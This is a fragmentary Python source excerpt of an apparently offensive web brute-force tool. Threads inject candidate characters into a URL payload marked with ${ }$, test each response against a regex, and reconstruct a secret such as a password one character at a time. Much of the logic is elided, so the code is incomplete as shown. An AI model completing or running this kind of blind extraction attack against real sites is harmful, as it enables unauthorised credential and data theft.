...
def check(payload, key, verbose, hitclause):
    ...
    try:
        ...
        if(verbose):
            print("Payload: " + payload[0] + payload[1] + key + payload[2] + " on " + URL + " hit:" + str(regex_hit))
        return regex_hit
...
class CharThread(Thread):
    def __init__(self, thread_id, name, counter, payload, key, verbose, hitclause):
    ...
    def run(self):
        ...
        if check(self.payload, self.key, self.verbose, self.hitclause):
            print(self.payload[1] + self.key+": True, moving on to next payload")
            lockP.acquire()
            PASSWD = self.key
            HIT = True
            lockP.release()
...
def parse_payload(payload):
    ...
    if ind1 == -1 or ind2 == -1:
        print("Use ${ payload }$ seperator clause for where the brute force will be applied")
        exit(0)
...
██║░░██║░░░██║░░░░░░██║░░░██║░░░░░██║██████╔╝░░░██║░░░╚█████╔╝███████╗""")
        ...
        for i in range(1, len(args)):
            if args[i] == "-charset":
                ...
                # parse the payload for the charset injection (suggested regex for charset is urlclause${}$urlclause)
                i += 1
                payload = parse_payload(args[i]) # list content: [left, payload , right] in url format but listed
        ...
        sleep(0.5)
        print("Running scan on "+ URL + "with payload" + payload[0] + payload[1] + payload[2] + ", verbose:" + str(verbose))
...
def run_attack(charset, timing_ms, payload, verbose, hitclause):
    ...
    while True:
        ...
        for c in range(len(charset)):
            ...
            t = CharThread(c, "T-"+test_key, c, payload, test_key, verbose, hitclause)
